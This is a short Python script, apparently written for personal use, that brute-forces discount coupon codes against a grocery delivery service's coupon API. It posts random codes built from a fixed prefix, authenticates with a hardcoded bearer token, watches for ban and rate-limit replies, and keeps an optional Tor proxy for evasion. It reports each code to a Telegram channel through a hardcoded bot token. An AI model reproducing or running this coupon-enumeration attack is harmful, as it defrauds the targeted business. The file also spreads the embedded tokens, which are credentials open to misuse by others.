
import uuid


import time
import json
import random
import string
import random
import requests
import telebot
####bot spam ###
tok = "7662510170:AAEtrVLxiBS8nAuQws9bes4OPOHI0dduDYM"
ch_id = "7037898496"
botA = telebot.TeleBot(token=tok)

def generate_code(prefix, total_length=12):
    # حساب طول الجزء العشوائي
    random_length = total_length - len(prefix)
    # توليد أجزاء عشوائية من الحروف والأرقام
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random_length))
    return prefix + random_part

# الجزء الثابت
fixed_part = "em1500t28"
proxies = {
        'http': 'socks5h://localhost:9050',
        'https': 'socks5h://localhost:9050'
    }
def t():
    code = generate_code(fixed_part)
    print(code)
    #code="em1500t2yt8a"
    url = "https://www.breadfast.com/ar/wp-json/breadfast/v3/main/get-coupon-data"
    
    payload = {
      'code': code,
    }
    
    headers = {
      'User-Agent': "okhttp/3.12.13",
      'Connection': "Keep-Alive",
      'Accept': "application/json",
      'Accept-Encoding': "gzip",
    #  'cache-control': "no-cache",
      'authorization': "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwczpcL1wvd3d3LmJyZWFkZmFzdC5jb20iLCJpYXQiOjE3MzY0MzMwNjIsIm5iZiI6MTczNjQzMzA2MiwiZXhwIjoxODIyODMzMDYyLCJkYXRhIjp7InVzZXIiOnsiaWQiOiIxOTUyMTE2Iiwicm9sZXMiOlsiY3VzdG9tZXIiXX19fQ.4idv_0XvkMDOG9bvhdwSQKyFAnU6xn0Toc_yksP5MHw",
    #  'credentials': "include",
    #  'accept-version': "4.25.3",
    }
    
    response = requests.post(url, data=payload, headers=headers,)#proxies=proxies
    if "has banned you temporarily" in response.text:
        print("Ban")
    elif "rate_limit_exceeded" in response.text:
        print("Server error")
    elif "!DOCTYPE html" in  response.text:
        print("Server Bad")
   # else:print(response.json())
    else:
            try:
                if "غير مسجل "in response.json()["data"]["message"]:
                    print("Faild")
                    botA.send_message(chat_id=ch_id, text="fail" + code)
                 
                else:
                    
                    #print(response.text)
                    botA.send_message(chat_id=ch_id, text=code)
                    print(response.json())
                
            except:
                             
                botA.send_message(chat_id=ch_id, text=code)
                print(response.text)

while True:
    try:
        t()
        time.sleep(60) 
    except:
        pass
      
